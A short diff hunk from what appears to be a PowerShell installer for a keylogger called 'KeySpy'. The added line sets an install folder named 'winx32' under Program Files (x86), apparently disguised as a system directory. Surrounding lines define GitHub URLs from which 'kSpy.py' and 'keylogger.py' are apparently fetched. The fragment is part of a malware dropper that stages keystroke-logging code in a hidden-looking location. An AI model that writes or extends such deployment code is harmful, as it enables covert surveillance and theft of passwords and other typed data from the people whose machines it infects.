@@ -44,6 +44,7 @@
 #     New-Item -Path $winx32Folder -ItemType Directory -Force
 # }
 
+$winx32Folder = "C:\Program Files (x86)\winx32"
 # Define file URLs
 $kSpyUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/kSpy.py"
 $keyloggerUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/keylogger.py"
